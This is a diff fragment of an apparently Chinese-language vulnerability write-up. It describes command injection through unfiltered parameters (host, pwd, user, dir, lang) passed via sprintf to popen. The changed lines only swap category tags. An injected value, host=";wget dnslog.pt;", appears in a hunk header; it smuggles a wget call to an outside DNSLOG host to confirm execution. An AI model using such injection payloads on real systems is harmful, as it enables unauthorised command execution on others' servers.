@@ -65,11 +65,11 @@ error_reporting(0);
 
 深入探索
 
-计算机安全
+硬盘驱动器
 
-编程
+网络
 
-软件
+防病毒程序与恶意软件
 
 多个参数如`host`、`pwd`、`user`、`dir`、`lang`均未过滤或校验，被直接使用`sprintf`格式化拼接后使用`popen`进行[执行命令](https://mrxn.net/tag/rce)，造成[命令注入漏洞](https://mrxn.net/tag/rce)。
 
@@ -87,4 +87,4 @@ host=";wget dnslog.pt;"
 
 在DNSLOG平台成功收到DNS和HTTP请求
 
-云存储
+网络附属存储和个人云存储
